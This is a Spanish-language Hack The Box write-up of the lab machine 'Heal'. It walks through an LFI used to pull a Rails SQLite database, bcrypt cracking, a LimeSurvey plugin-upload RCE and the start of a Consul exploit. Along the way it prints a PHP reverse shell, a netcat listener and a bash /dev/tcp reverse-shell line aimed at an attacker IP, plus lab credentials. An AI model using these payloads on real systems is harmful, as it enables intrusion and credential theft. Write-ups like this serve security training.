---
layout: single
title: Hack The Box - Heal
excerpt: "**Runner** es una máquina de la plataforma Hack The Box de dificultad media que aborda temas como la explotación de tecnologías como TeamCity y Portainer, así como tunneling. La clave para su explotación radica en la enumeración."
date: 2025-06-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-Heal/heal.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Web Pentesting
tags:  
  - LFI
  - Gemfile
  - Tunneling
  - LimeSurvey
  - HashiCorp Consul

---


<style>
body
{
  margin: 0;
  padding: 0;
}

.glitch
  {
    position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-Heal/heal.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
 }

.glitch:before
  {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-Heal/heal.png");
    background-size: cover; /* contain for split effect */
    opacity: .5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

.glitch:hover:before
{
  animation: glitch1 1s linear infinite;
}

@keyframes glitch1
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 5px 0;
  }
  20%
  {
    background-position: -5px 0;
  }
  30%
  {
    background-position: 15px 0;
  }
  40%
  {
    background-position: -5px 0;
  }
  50%
  {
    background-position: -25px 0;
  }
  60%
  {
    background-position: -50px 0;
  }
  70%
  {
    background-position: 0 -20px;
  }
  80%
  {
    background-position: -60px -20px;
  }
  81%
  {
    background-position: 0 0;
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(360deg);
  }
}

@keyframes glitch2
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 15px 0;
  }
  15%
  {
    background-position: -15px 0;
  }
  20%
  {
    filter: hue-rotate(360deg);
  }
  25%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
}

@media (max-width: 767.5px) {

.glitch{
position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-Heal/heal.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


@media (max-width: 575.5px) { 

.glitch{
position: relative;
    width: 50%;
    height: 25vh;
    background-image:url("/assets/images/htb-writeup-Heal/heal.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


</style>
<body>
    <div class="glitch">  
    </div>
</body>

<br>

**Heal** es una máquina de la plataforma Hack The Box de dificultad media que aborda temas como la explotación Web como LFI (Local File Inclusion), enumeración de LimeSurvey, acceso a archivos SQLite y para la escalación de privilegios se tocan temas de tunneling y la explotación de la tecnología HashiCorp Consul.

## Enumeración
Realicé un escaneo de puertos con la herramienta **Nmap** e identifiqué los siguientes puertos abiertos:<br>
- 22 SSH
- 80 HTTP 

```bash
Nmap scan report for 10.10.11.46
Host is up, received user-set (0.27s latency).
Scanned at 2025-05-05 13:01:40 EDT for 28s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http?   syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Realicé otro escaneo con Nmap utilizando la opción `-sVC` para obtener más información de los servicios identificados y pude obtener el dominio: `heal.htb`

```bash
Nmap scan report for 10.10.11.46
Host is up, received user-set (0.42s latency).
Scanned at 2025-05-05 13:05:54 EDT for 23s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Posteriormente, agregué el dominio al archivo `/etc/hosts`, apuntándolo a la IP de la máquina víctima, para poder visualizar correctamente la página web

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.46     heal.htb
```
## Enumeración Web

La página web de la máquina era la siguiente:

![](/assets/images/htb-writeup-Heal/dash.png)

Realicé un escaneo de vhosts y pude identificar un subdominio `api`

```bash
┌──(root㉿kali)-[/opt]
└─# ffuf -w /opt/subdomains-top1million-5000.txt:FUZZ -u http://heal.htb/ -H 'Host: FUZZ.heal.htb' -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://heal.htb/
 :: Wordlist         : FUZZ: /opt/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.heal.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 189ms]
:: Progress: [4989/4989] :: Job [1/1] :: 114 req/sec :: Duration: [0:00:30] :: Errors: 0 ::
```
De igual forma, al capturar las solicitudes y respuestas con Burp Suite mientras intentaba iniciar sesión y crear una cuenta, se mostró el subdominio `api.heal.htb`

![](/assets/images/htb-writeup-Heal/loginapi.png)

Una vez que agregué el subdominio al archivo `/etc/hosts`, pude crear una cuenta

![](/assets/images/htb-writeup-Heal/cuenta.png)

![](/assets/images/htb-writeup-Heal/dash2.png)

Al consultar directamente el subdominio en el navegador, obtuve más información sobre la tecnología empleada

![](/assets/images/htb-writeup-Heal/redis.png)

## Local File Inclusion (LFI)

Al seguir todo el flujo donde se llena la información del usuario y se exporta como PDF, identifiqué una solicitud en la que se obtiene el archivo generado

![](/assets/images/htb-writeup-Heal/paramfile.png)

En este campo identifiqué una vulnerabilidad de Local File Inclusion (LFI), ya que al sustituir el nombre del archivo por `/etc/passwd`, pude obtener el contenido de dicho archivo

![](/assets/images/htb-writeup-Heal/passwd.png)

Me di cuenta de que podía acceder al archivo `/var/log/nginx/access.log`, por lo que intenté realizar un ataque de Log Poisoning para convertir la vulnerabilidad LFI en una RCE. Sin embargo, no tuve éxito

![](/assets/images/htb-writeup-Heal/log.png)

Continué navegando en la página web y, en la sección `survey`, identifiqué otro subdominio: `take-survey.heal.htb`

![](/assets/images/htb-writeup-Heal/survey.png)

Agregué el nuevo subdominio al archivo `/etc/hosts` y, al consultarlo, encontré otra página web donde también se menciona un posible usuario: `ralph`

![](/assets/images/htb-writeup-Heal/lime.png)

Regresando a la vulnerabilidad LFI, y considerando que la tecnología utilizada era Rails, investigué y descubrí que existe un archivo de base de datos donde se almacenan los usuarios y sus contraseñas hasheadas. Para encontrar la ruta exacta de ese archivo, primero consulté la documentación oficial de Rails en GitHub, donde se menciona la existencia de un archivo llamado `Gemfile`.

Intenté acceder a este archivo a través del LFI utilizando diferentes rutas: `download?filename=Gemfile` y `download?filename=../Gemfile`, pero no obtuve resultados. Finalmente, al probar con `download?filename=../../Gemfile`, logré acceder al contenido del archivo.

![](/assets/images/htb-writeup-Heal/gem.png)

Revisando la documentación, encontré que el archivo `config/database.yml` puede proporcionar más información sobre la ubicación de la base de datos, así que también lo consulté mediante el LFI

![](/assets/images/htb-writeup-Heal/database.png)

Al analizar el archivo, observé que se menciona que la base de datos se almacena en `storage/development.sqlite3`

![](/assets/images/htb-writeup-Heal/sqlite.png)

Una vez que confirmé la ruta del archivo, lo descargué con `curl` para poder analizar su contenido

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# curl --path-as-is -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0fQ.J0NnCAdf82F0IukEy8HTIUHK49VpBnwHhtd4hBp-Y_w' 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' -o  test.sqlite3

┌──(root㉿kali)-[/home/kali]
└─# file test.sqlite3 
test.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2
```
Utilicé la opción `--path-as-is` en `curl` para evitar que la herramienta normalizara la ruta. Esta opción es crucial al explotar vulnerabilidades LFI, ya que permite enviar rutas con `../` sin que sean modificadas, asegurando que el servidor las procese tal como fueron escritas

Con el archivo descargado, enumeré las tablas contenidas en la base de datos y encontré una llamada `users`. Al consultar sus registros, identifiqué los nombres de usuario junto con sus hashes

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# sqlite3 test.sqlite3
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
ar_internal_metadata  token_blacklists    
schema_migrations     users               
sqlite> select * from users;
1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|user@htb.com|$2a$12$ZA2UNAZZmXNXsvhHkQZcGe2F8.W65qrvHnHIGwLV4eSTDaZkwEYjm|2025-05-19 13:05:00.305712|2025-05-19 13:05:00.305712|user|user|0
3|test@htb.com|$2a$12$Qlrlfns13A0wvb7po1cUo.MvK0yTs.ibAQI4G1krNHP/vagzBxQu2|2025-05-19 21:33:01.074219|2025-05-19 21:33:01.074219|test|admin|0
sqlite> 
```
Con Hash Identifier detecté que el algoritmo del hash era `bcrypt`, así que utilicé John the Ripper para intentar romperlo

![](/assets/images/htb-writeup-Heal/hash.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# john hash-b --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
147258369        (?)     
1g 0:00:00:15 DONE (2025-05-05 16:44) 0.06317g/s 31.83p/s 31.83c/s 31.83C/s pasaway..claire
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Con esta contraseña logré acceder al portal de administrador de LimeSurvey

## LimeSurvey RCE

Una vez dentro del portal web, identifiqué que la versión del CMS LimeSurvey era la `6.6.4`, la cual es vulnerable a una ejecución remota de código (RCE). Para explotarla, utilicé el siguiente repositorio de GitHub: [Limesurvey 6.6.4 RCE](https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE?source=post_page-----0a54c2c09c5e---------------------------------------).

Después de clonar el repositorio, modifiqué la IP y el puerto en el archivo `revshell.php` para recibir la conexión reversa. 

```bash
┌──(root㉿kali)-[/opt/Limesurvey-6.6.4-RCE]
└─# cat revshell.php                                 
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.62';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Posteriormente, comprimí los archivos `config.xml` y `revshell.php` en un archivo `.zip`, tal como lo requiere el exploit.

```bash
┌──(root㉿kali)-[/opt/Limesurvey-6.6.4-RCE]
└─# zip -r N4s1rl1.zip config.xml revshell.php
  adding: config.xml (deflated 59%)
  adding: revshell.php (deflated 68%)
```
Después, en la sección `Configuration > Plugins`, seleccioné la opción `Upload & Install`

![](/assets/images/htb-writeup-Heal/plugin.png)

Posteriormente, busqué el archivo comprimido previamente (`N4s1rl1.zip`) para cargarlo e instalarlo desde el panel

![](/assets/images/htb-writeup-Heal/NA.png)

Una vez hecho esto, pude ver el archivo como un plugin instalado. Lo siguiente que hice fue activarlo.

![](/assets/images/htb-writeup-Heal/activate.png)

Una vez activado el plugin, hice un _hover_ sobre él para visualizar su ID, ya que este valor debía sustituirse en el archivo `exploit.py`

![](/assets/images/htb-writeup-Heal/take.png)

```bash
print(Fore.CYAN + "\n[INFO] Activating Plugin...")
activate_page = req.get(url + "/index.php/admin/pluginmanager?sa=activate")
soup = BeautifulSoup(activate_page.text, 'html.parser')
csrf_token4 = soup.find('input', {'name': 'YII_CSRF_TOKEN'})['value']
activate_creds = {"YII_CSRF_TOKEN": csrf_token4, "pluginId": "19"}  # CHANGE PLUGIN ID 
activate_response = req.post(url + "/index.php/admin/pluginmanager?sa=activate", data=activate_creds)
print(Fore.GREEN + "[SUCCESS] Plugin Activated Successfully!")
```
Finalmente, configuré un listener con Netcat en el puerto especificado en el archivo `revshell.php` y ejecuté el script para recibir la reverse shell.

```bash
┌──(root㉿kali)-[/opt/Limesurvey-6.6.4-RCE]
└─# python3 exploit.py http://take-survey.heal.htb ralph 147258369 80 
 _   _ _  _  ____  _ ____  _     _ 
| \ | | || |/ ___|/ |  _ \| |   / |                                                                 
|  \| | || |\___ \| | |_) | |   | |                                                                    
| |\  |__   _|__) | |  _ <| |___| |                                                                   |_| \_|  |_||____/|_|_| \_\_____|_|                                                                                                                          
[INFO] Retrieving CSRF token for login...
[SUCCESS] CSRF Token Retrieved: Sm5ZMGpueVU5ek1ZaW5WTDZWZnhzYlhiWXgyblBPYmLzeg2s9HbhHlyydqDRaZ5WNDysb4QWLH-Tm8xfJ6Pgrg==

[INFO] Sending Login Request...                                                                                                                              
[SUCCESS] Login Successful!

[INFO] Uploading Plugin...                                                                                                                                   
[SUCCESS] Plugin Uploaded Successfully!

[INFO] Installing Plugin...                                                                                                                                  
[SUCCESS] Plugin Installed Successfully!

[INFO] Activating Plugin...                                                                                                                                  
[SUCCESS] Plugin Activated Successfully!

[INFO] Triggering Reverse Shell...
```
```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 443                                      
listening on [any] 443 ...
connect to [10.10.16.62] from heal.htb [10.10.11.46] 54396
Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 22:23:30 up  3:53,  0 users,  load average: 0.04, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
## www-data to Ron

Una vez dentro de la máquina, realicé un tratamiento de la TTY para poder trabajar de forma más cómoda.

```bash
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@heal:/$ ^Z
zsh: suspended  nc -lvp 443

┌──(root㉿kali)-[/home/kali]
└─# stty raw -echo;fg
[1]  + continued  nc -lvp 443
                               reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@heal:/$ export TERM=xterm
www-data@heal:/$ export SHELL=bash
```
Dentro del directorio de LimeSurvey encontré un archivo interesante: `setdebug.php`

```bash
www-data@heal:~/limesurvey$ cat setdebug.php
<?php

/*
 * ------------------------------------------------------------------
 *  Setup YII_DEBUG constant and error reporting according to config
 * ------------------------------------------------------------------
 */
if (!defined('YII_DEBUG')) {
    if (file_exists(APPPATH . 'config' . DIRECTORY_SEPARATOR . 'config.php')) {
        $settings = include(APPPATH . 'config' . DIRECTORY_SEPARATOR . 'config.php');
    } else {
        $settings = [];
    }

    // Set debug : if not set : set to default from PHP 5.3
    if (isset($settings['config']['debug'])) {
        if ($settings['config']['debug'] > 0) {
            define('YII_DEBUG', true);
            if ($settings['config']['debug'] > 1) {
                error_reporting(E_ALL);

                // @see https://manual.limesurvey.org/Code_quality_guide#Assertions
                assert_options(ASSERT_ACTIVE, true);
                assert_options(ASSERT_WARNING, false);
                assert_options(
                    ASSERT_CALLBACK,
                    function ($file, $line, $assertion, $message) {
                        throw new Exception("The assertion $assertion in $file on line $line has failed: $message");
                    }
                );
            } else {
                error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED);
            }
        } else {
            define('YII_DEBUG', false);
            error_reporting(0);
        }
    } else {
        error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED);// Not needed if user doesn't remove their 'debug'=>0, for application/config/config.php (Installation is OK with E_ALL)
    }
    unset($settings);
}
```
En este archivo se hace mención a otro archivo de configuración: `application/config/config.php`, el cual contiene credenciales. Probé estas credenciales con ambos usuarios y funcionaron para `ron`

```bash
www-data@heal:~/limesurvey$ cat application/config/config.php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user',
                        'password' => 'AdmiDi0_pA$$w0rd',
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),

                 'session' => array (
                        'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
                        // Uncomment the following lines if you need table-based sessions.
                        // Note: Table-based sessions are currently not supported on MSSQL server.
                        // 'class' => 'application.core.web.DbHttpSession',
                        // 'connectionID' => 'db',
                        // 'sessionTableName' => '{{sessions}}',
                 ),

                'urlManager' => array(
                        'urlFormat' => 'path',
                        'rules' => array(
                                // You can add your own rules here
                        ),
                        'showScriptName' => true,
                ),

                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
                //'request' => array(
                //      'baseUrl' => '/limesurvey',
                //),
        ),
        // For security issue : it's better to set runtimePath out of web access
        // Directory must be readable and writable by the webuser
        // 'runtimePath'=>'/var/limesurvey/runtime/'
        // Use the following config variable to set modified optional settings copied from config-defaults.php
        'config'=>array(
        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
        // on your webspace.
        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
                'debug'=>0,
                'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2

                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
                // public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
                //'publicurl' => 'https://www.example.org/limesurvey',

                // Update default LimeSurvey config here
        )
);
/* End of file config.php */
/* Location: ./application/config/config.php */
```

```bash
www-data@heal:~/limesurvey$ su ron
Password: 
ron@heal:/var/www/limesurvey$ 
```
## Escalada de privilegios

Al enumerar los puertos abiertos de la máquina de forma interna, encontré los siguientes:

```bash
ron@heal:/tmp$ netstat -natp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:57220         127.0.0.1:5432          TIME_WAIT   -                   
tcp        0      0 10.10.11.46:80          10.10.16.62:45524       ESTABLISHED -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:42804         ESTABLISHED -                   
tcp        0      0 10.10.11.46:54396       10.10.16.62:443         ESTABLISHED 49746/bash          
tcp        0      0 10.10.11.46:80          10.10.16.62:58618       ESTABLISHED -                   
tcp        0      0 10.10.11.46:80          10.10.16.62:54958       ESTABLISHED -                   
tcp        0      0 127.0.0.1:45810         127.0.0.1:3001          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:53384         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 127.0.0.1:8500          127.0.0.1:55686         ESTABLISHED -                   
tcp        0      0 127.0.0.1:33380         127.0.0.1:5432          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:57031         127.0.0.1:8300          ESTABLISHED -                   
tcp        0      0 10.10.11.46:41702       10.10.16.62:4433        ESTABLISHED -                   
tcp        0      0 127.0.0.1:53204         127.0.0.1:3001          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:49082         127.0.0.1:3001          TIME_WAIT   -                   
tcp        0      0 10.10.11.46:22          10.10.16.62:41740       ESTABLISHED -                   
tcp        0   1916 10.10.11.46:22          10.10.16.62:39490       ESTABLISHED -                   
tcp        0      0 127.0.0.1:35406         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 127.0.0.1:43710         127.0.0.1:5432          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:42804         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:35406         ESTABLISHED -                   
tcp        0      0 127.0.0.1:8500          127.0.0.1:55676         ESTABLISHED -                   
tcp        0      0 127.0.0.1:42654         127.0.0.1:3000          TIME_WAIT   -                   
tcp        0      0 10.10.11.46:80          10.10.16.62:58642       ESTABLISHED -                   
tcp        0      0 127.0.0.1:41282         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 127.0.0.1:50436         127.0.0.1:3001          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:57730         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:35394         ESTABLISHED -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:53384         ESTABLISHED -                   
tcp        0      0 127.0.0.1:47676         127.0.0.1:3000          TIME_WAIT   -                   
tcp        0      0 10.10.11.46:80          10.10.16.62:34102       ESTABLISHED -                   
tcp        0      0 127.0.0.1:58324         127.0.0.1:3000          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:59310         127.0.0.1:5432          TIME_WAIT   -                   
tcp        0      0 10.10.11.46:80          10.10.14.137:46252      ESTABLISHED -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:57730         ESTABLISHED -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:41284         ESTABLISHED -                   
tcp        0      0 127.0.0.1:8300          127.0.0.1:50495         ESTABLISHED -                   
tcp        0      0 127.0.0.1:35394         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 127.0.0.1:52822         127.0.0.1:3001          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:33678         ESTABLISHED -                   
tcp        0      0 127.0.0.1:38738         127.0.0.1:5432          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:33678         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 127.0.0.1:53490         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 10.10.11.46:80          10.10.16.62:58656       ESTABLISHED -                   
tcp        0      0 127.0.0.1:57734         127.0.0.1:5432          TIME_WAIT   -                   
tcp        0      0 10.10.11.46:80          10.10.16.62:37626       ESTABLISHED -                   
tcp        0      0 127.0.0.1:53502         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:53490         ESTABLISHED -                   
tcp        0      0 127.0.0.1:43152         127.0.0.1:3001          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:41284         127.0.0.1:3000          ESTABLISHED -                   
tcp        0      0 10.10.11.46:80          10.10.16.62:37624       ESTABLISHED -                   
tcp        0      0 127.0.0.1:8300          127.0.0.1:57031         ESTABLISHED -                   
tcp        0      0 10.10.11.46:80          10.10.16.62:54964       ESTABLISHED -                   
tcp        0      0 127.0.0.1:42666         127.0.0.1:3000          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:41282         ESTABLISHED -                   
tcp        0      0 127.0.0.1:55686         127.0.0.1:8500          ESTABLISHED -                   
tcp        0      0 127.0.0.1:59040         127.0.0.1:3000          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:3000          127.0.0.1:53502         ESTABLISHED -                   
tcp        0      0 127.0.0.1:45710         127.0.0.1:3000          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:50495         127.0.0.1:8300          ESTABLISHED -                   
tcp        0      0 127.0.0.1:55676         127.0.0.1:8500          ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```
Empecé a realizar peticiones con `curl` a los puertos abiertos internamente para verificar si respondían, y me di cuenta de que los puertos `3000` y `8500` devolvían una respuesta.

```bash
ron@heal:/tmp$ curl http://127.0.0.1:3000/
<!DOCTYPE html>
<html lang="en">
  <head>
  
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta
      name="description"
      content="Web site created using create-react-app"
    />
    
    <!--
      manifest.json provides metadata used when your web app is installed on a
      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
    -->
    <link rel="manifest" href="/manifest.json" />
    <!--
      Notice the use of  in the tags above.
      It will be replaced with the URL of the `public` folder during the build.
      Only files inside the `public` folder can be referenced from the HTML.

      Unlike "/favicon.ico" or "favicon.ico", "/favicon.ico" will
      work correctly both with client-side routing and a non-root public URL.
      Learn how to configure a non-root public URL by running `npm run build`.
    -->
    <title>Heal</title>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
    <!--
      This HTML file is a template.
      If you open it directly in the browser, you will see an empty page.

      You can add webfonts, meta tags, or analytics to this file.
      The build step will place the bundled scripts into the <body> tag.

      To begin the development, run `npm start` or `yarn start`.
      To create a production bundle, use `npm run build` or `yarn build`.
    -->
  <script src="/static/js/bundle.js"></script><script src="/static/js/0.chunk.js"></script><script src="/static/js/main.chunk.js"></script></body>
</html>
```
```bash
ron@heal:/tmp$ curl http://127.0.0.1:8500/
<a href="/ui/">Moved Permanently</a>.
```
Realicé un Local Port Forwarding con SSH en ambos puertos y me di cuenta de que en el puerto `3000` estaba corriendo la misma aplicación web que se ejecuta en `http://heal.htb/`, mientras que en el puerto `8500` se mostraba una aplicación distinta.

```bash
──(root㉿kali)-[/opt/chuleta]
└─# ssh -L 8500:localhost:8500 ron@10.10.11.46

ron@10.10.11.46's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon May  5 11:08:45 PM UTC 2025

  System load:  0.0               Processes:             260
  Usage of /:   73.7% of 7.71GB   Users logged in:       1
  Memory usage: 30%               IPv4 address for eth0: 10.10.11.46
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

29 updates can be applied immediately.
18 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon May  5 23:06:16 2025 from 10.10.16.62
ron@heal:~$ cd /tmp
```
![](/assets/images/htb-writeup-Heal/EP.png)

Al revisar el sitio, identifiqué que se trataba de la tecnología HashiCorp Consul, en su versión `1.19.2`. Investigando un poco más, descubrí que esta versión es vulnerable a una ejecución remota de comandos (RCE) a través de la API de Consul. Para explotarla, utilicé el siguiente script: [Hashicorp Consul - Remote Command Execution via Services API](https://github.com/owalid/consul-rce)

Como primer paso, creé un script con una reverse shell en Bash
```bash
ron@heal:/tmp$ cat pwn.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.62/4433 0>&1
ron@heal:/tmp$ 
```
